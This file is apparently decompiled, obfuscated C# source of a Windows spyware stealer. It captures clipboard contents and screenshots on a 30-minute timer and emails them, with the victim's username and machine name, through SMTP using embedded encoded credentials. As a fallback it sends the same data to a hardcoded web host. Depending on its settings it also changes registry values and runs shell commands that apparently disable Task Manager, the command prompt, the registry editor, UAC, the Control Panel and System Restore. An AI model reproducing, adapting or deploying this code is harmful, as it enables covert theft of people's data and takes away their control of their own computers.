using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using ns0;

namespace ns1;

internal class Class5
{
	public static string string_0;

	public static string string_1;

	public static string string_2;

	public static string string_3;

	public static string string_4;

	public static string string_5;

	public static string string_6;

	public static string string_7;

	public static string string_8;

	public static string string_9;

	public static string string_10;

	public static string string_11;

	public static string string_12 = "";

	public static string string_13 = Class6.smethod_0("psfQ4Nh1kqvfxbjU0OTYt8HP15Ko1ZnVxwE=", "False");

	public static string string_14 = Class6.smethod_0("wtvR68m20N8B", "False");

	public static string string_15 = Class6.smethod_0("vNHj5paw0dDf1HfH3uMB", "False");

	public static int int_0 = 587;

	public static string string_16 = Class6.smethod_0("USERTASK", "False");

	public static string string_17 = Class6.smethod_0("USERCMD", "False");

	public static string string_18 = Class6.smethod_0("USERREG", "False");

	public static string string_19 = Class6.smethod_0("USERUAC", "False");

	public static string string_20 = Class6.smethod_0("USERFOLDER", "False");

	public static string string_21 = Class6.smethod_0("USERCONTROL", "False");

	public static string string_22 = Class6.smethod_0("USERRESTORE", "False");

	public static string string_23 = Class6.smethod_0("DLEXSite", "False");

	public static string string_24 = Class6.smethod_0("USERSITE", "False");

	public static string string_25 = Class6.smethod_0("USERTYPE", "False");

	public static string string_26 = Class6.smethod_0("USERTITLE", "False");

	public static string string_27 = Class6.smethod_0("USERBODY", "False");

	public static string string_28 = Class6.smethod_0("USERSCREENSHOTS", "False");

	public static string string_29 = Class6.smethod_0("grjO3MAK", "False");

	public static int int_1 = 1800000;

	public static string string_30 = "";

	public static string string_31 = "";

	public static int int_2 = 0;

	public static Class7 class7_0;

	public static Thread thread_0 = new Thread(smethod_1);

	public static Thread thread_1 = new Thread(smethod_2);

	public static Thread thread_2 = new Thread(Class10.Class11.smethod_0);

	[STAThread]
	public static void Main()
	{
		int num = default(int);
		try
		{
			IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread.Sleep(60000);
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)Class2.smethod_0()).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)Class2.smethod_0()).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_2.IsBackground = true;
			thread_2.Start();
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5, num);
			ProjectData.ClearProjectError();
		}
		int num2 = 0;
		while (true)
		{
			num = 1;
			try
			{
				if (num2 == 3)
				{
					Application.Restart();
				}
				class7_0 = new Class7(string_31);
				Class7.smethod_1();
			}
			catch (Exception ex6)
			{
				ProjectData.SetProjectError(ex6, num);
				num2 = checked(num2 + 1);
				ProjectData.ClearProjectError();
				continue;
			}
			break;
		}
		try
		{
			thread_0.IsBackground = true;
			thread_0.Start();
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class8.Class9.smethod_0();
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_16, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)Class2.smethod_0()).get_Registry().SetValue(Class6.smethod_0("cY+Ur6dsmaGojXeYrqubbparqbePuMa3uo6gnL+rm7PCxa6doKa/to2zxsmkbLnByK2XuKW7upytvsSkebO7v6uSqcKym6K3w7u1HQ==", "False"), Class6.smethod_0("hcXaz8KtwbvP06ypzuAJ", "False"), (object)Class6.smethod_0("TCw=", "False"), RegistryValueKind.DWord);
			}
			if (Operators.CompareString(string_17, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)Class2.smethod_0()).get_Registry().SetValue(Class6.smethod_0("ZoSJpJxhjpadgmyNo6CQY4ugnqyErbusr4OVlLqph5ytsLB6hq2ur42ss7GxepCtuaGNsLenkJesuLCqKA==", "False"), Class6.smethod_0("c7PIvbCbr5ipkhc=", "False"), (object)Class6.smethod_0("TCw=", "False"), RegistryValueKind.DWord);
			}
			if (Operators.CompareString(string_18, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)Class2.smethod_0()).get_Registry().SetValue(Class6.smethod_0("h6Wqxb2Cr7e+o42uxMGxhKzBv82lztzN0KS2stXBscnY28SztrzVzKPJ3N+6gs/X3sOtzrvR0LLD1Nq6j8nR1cGov9jIsbjN2dHLBw==", "False"), Class6.smethod_0("a6vAtaiTp5+5rZC1wca/e7G8wLkf", "False"), (object)Class6.smethod_0("TCw=", "False"), RegistryValueKind.DWord);
			}
			if (Operators.CompareString(string_19, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				Interaction.Shell(Class6.smethod_0("ipzJy8+1xtzr2aO15ufarM+gpsKqz9Giy7/HjaPRZ4fk3dSry9+Zwprb4OjLtJWf0NisyZvZ3qyCrriqZ6q4wLOjtby6up6jv7nClMvQ5tW60dPowp7L29jVvtXJt9u51NLi2p3H3+fPttDJxNWzy9Ddy7q+wO3Zu8falJW9grLix6nO0sC7iIKc6IaZp7TTqp6xv7iGdsaNpIZ2yAE=", "False"), (AppWinStyle)0, false, -1);
			}
			if (Operators.CompareString(string_20, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				Interaction.Shell(Class6.smethod_0("cH6La56CnWSTiGGOoJ6shK27rK+DlZG0oJCot7qjkpWbtKuCqLu+mWGutr2ijK2asK+RorO5mW6osLSgh563p4KWqbC6r4OrZHqzPoezkayKnam9jI6trbqrkVlzv11wfouqgXWIlo9dTZ1kfF1Nnyo=", "False"), (AppWinStyle)2, false, -1);
			}
			if (Operators.CompareString(string_21, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				Interaction.Shell(Class6.smethod_0("a3mGZpl9mF+Og1yJm5mnf6i2p6p+kIyvm4ujsrWejZCWr6Z9o7a5lFypsbidh6iVq6qMna60lGmjq6+bgpmyon2RpKu1qn6mX3WuOYKuiaeHqLG1pGmVraukOWOzZopee56Kj2iGg2ZnfVRwZmd/Lg==", "False"), (AppWinStyle)0, false, -1);
			}
			if (Operators.CompareString(string_22, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)Class2.smethod_0()).get_Registry().SetValue(Class6.smethod_0("h6Wqxb2Lqaitqp6npq+miKiqyLGOoLnDn5GfwbnHoszU382lzsHDx62+1OPRX6i5yKG0zNfRzLOwyt7RqMnTyLG4zdnRy5G/2ODNsb8J", "False"), Class6.smethod_0("jc3i18q1ycLIAQ==", "False"), (object)Class6.smethod_0("TCw=", "False"), RegistryValueKind.DWord);
			}
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_1.IsBackground = true;
			thread_1.Start();
		}
		catch (Exception ex10)
		{
			ProjectData.SetProjectError(ex10, num);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void smethod_0(ref double double_0)
	{
		try
		{
			DateTime t = DateAndTime.get_Now().AddSeconds(double_0);
			while (DateTime.Compare(DateAndTime.get_Now(), t) < 0)
			{
				Application.DoEvents();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		//IL_0175: Unknown result type (might be due to invalid IL or missing references)
		//IL_017c: Expected O, but got Unknown
		string text = "";
		checked
		{
			while (true)
			{
				Thread.Sleep(int_1);
				text = "";
				string text2 = "";
				try
				{
					text = Class6.smethod_0("mpaiqZt8l6Kpm3yXoqmbfJeiqZt8l6Kpm3yXqNjHr7zUzdCjl6Kpm3yXoqmbfJeiqZt8l6Kpm3yXoqmbfJjCCg==", "False") + Environment.NewLine + Environment.NewLine + ((Computer)Class2.smethod_0()).get_Clipboard().GetText() + Environment.NewLine + Environment.NewLine + Class6.smethod_0("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				double double_ = 0.2;
				smethod_0(ref double_);
				try
				{
					WebClient webClient = new WebClient();
					text2 = Class6.smethod_0("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(Class6.smethod_0("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + Class6.smethod_0("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					text2 = "";
					ProjectData.ClearProjectError();
				}
				double_ = 1.0;
				smethod_0(ref double_);
				try
				{
					if (Operators.CompareString(string_28, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
						Bitmap val3 = val;
						((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + int_2 + Class6.smethod_0("ZsPMzBI=", "False"));
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				double_ = 0.3;
				smethod_0(ref double_);
				try
				{
					if (Operators.CompareString(string_31, "", false) != 0)
					{
						string_30 = string_31 + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
						try
						{
							MailMessage mailMessage = new MailMessage();
							MailMessage mailMessage2 = mailMessage;
							mailMessage2.From = new MailAddress(string_13);
							mailMessage2.To.Add(string_13);
							mailMessage2.Subject = Class6.smethod_0("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + Class6.smethod_0("aQ0=", "False") + Environment.MachineName.ToString();
							mailMessage2.Body = string_30;
							try
							{
								if (Operators.CompareString(string_28, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
								{
									Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + int_2 + Class6.smethod_0("ZsPMzBI=", "False"));
									mailMessage2.Attachments.Add(item);
								}
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
							mailMessage2 = null;
							SmtpClient smtpClient = new SmtpClient(string_15);
							SmtpClient smtpClient2 = smtpClient;
							smtpClient2.Port = int_0;
							smtpClient2.EnableSsl = true;
							smtpClient2.Credentials = new NetworkCredential(string_13, string_14);
							smtpClient2.Send(mailMessage);
							smtpClient2 = null;
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							try
							{
								string text3 = "http://lls.3owl.com/zztop.php";
								_ = (HttpWebResponse)WebRequest.Create(text3 + "?to=" + string_13 + "&subject=" + Strings.Replace(Class6.smethod_0("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + Class6.smethod_0("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(string_30, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + string_13).GetResponse();
							}
							catch (Exception projectError6)
							{
								ProjectData.SetProjectError(projectError6);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
				}
				string_30 = "";
				string_31 = "";
				string_12 = "";
				int_2++;
			}
		}
	}

	public static void smethod_2()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class6.smethod_0("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class6.smethod_0("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		try
		{
			double double_ = 25.0;
			smethod_0(ref double_);
			string text = string_0.ToString() + Environment.NewLine + Environment.NewLine + string_1 + Environment.NewLine + Environment.NewLine + string_2 + Environment.NewLine + Environment.NewLine + string_3 + Environment.NewLine + Environment.NewLine + string_4 + Environment.NewLine + Environment.NewLine + string_5 + Environment.NewLine + Environment.NewLine + string_6 + Environment.NewLine + Environment.NewLine + string_7 + Environment.NewLine + Environment.NewLine + string_8 + Environment.NewLine + Environment.NewLine + string_9 + Environment.NewLine + Environment.NewLine + string_10 + Environment.NewLine + Environment.NewLine + string_11;
			if (!((Operators.CompareString(text, "", false) != 0) | (Operators.CompareString(text, (string)null, false) != 0)))
			{
				return;
			}
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(string_13);
				mailMessage2.To.Add(string_13);
				mailMessage2.Subject = Class6.smethod_0("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + Class6.smethod_0("aQ0=", Class6.smethod_0("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(string_15);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = int_0;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(string_13, string_14);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = "http://lls.3owl.com/zztop.php";
					_ = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + string_13 + "&subject=" + Strings.Replace(Class6.smethod_0("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + Class6.smethod_0("aQ0=", Class6.smethod_0("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + string_13).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}
}
